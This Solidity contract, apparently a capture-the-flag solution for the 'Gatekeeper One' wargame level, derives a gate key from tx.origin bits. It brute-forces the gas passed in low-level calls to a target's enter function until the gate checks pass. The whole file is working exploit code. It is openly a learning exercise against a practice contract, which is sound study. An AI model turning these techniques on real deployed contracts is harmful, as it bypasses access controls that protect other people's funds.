// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract GatekeeperOneAttack {

    event AttackAttemptEvent(uint256 index, uint256 gas, bool result);

    function show() public view returns (
        uint32, uint16, uint64, uint64
    ) {
        bytes8 _gateKey = bytes8(uint64(uint16(tx.origin)) + 2 ** 32);
        return (
            uint32(uint64(_gateKey)),
            uint16(uint64(_gateKey)),
            uint64(_gateKey),
            uint16(tx.origin)
        );
    }

    function attack(address target, uint256 attempts) public returns (bool) {
        bytes8 key = bytes8(uint64(uint16(tx.origin)) + 2 ** 32);
        
        // NOTE: the proper gas offset to use will vary depending on the compiler
        // version and optimization settings used to deploy the factory contract.
        // To migitage, brute-force a range of possible values of gas to forward.
        // Using call (vs. an abstract interface) prevents reverts from propagating.
        bytes memory encodedParams = abi
            .encodeWithSignature(("enter(bytes8)"), key );

        // gas offset usually comes in around 210, give a buffer of 60 on each side
        for (uint256 i = 0; i < attempts; i++) {
            uint256 gas = i + 150 + 8191 * 3;
            (bool result, ) = address(target).call{gas: gas}(encodedParams);
            emit AttackAttemptEvent(
                i, gas, result
            );
            if(result) {
                // In the end, this did work. I just took a few tries. I think I tried
                // 3 or 4 times on Friday. But then on Sunday it worked the first time.
                return result;
            }
        }
        return false;
    }
}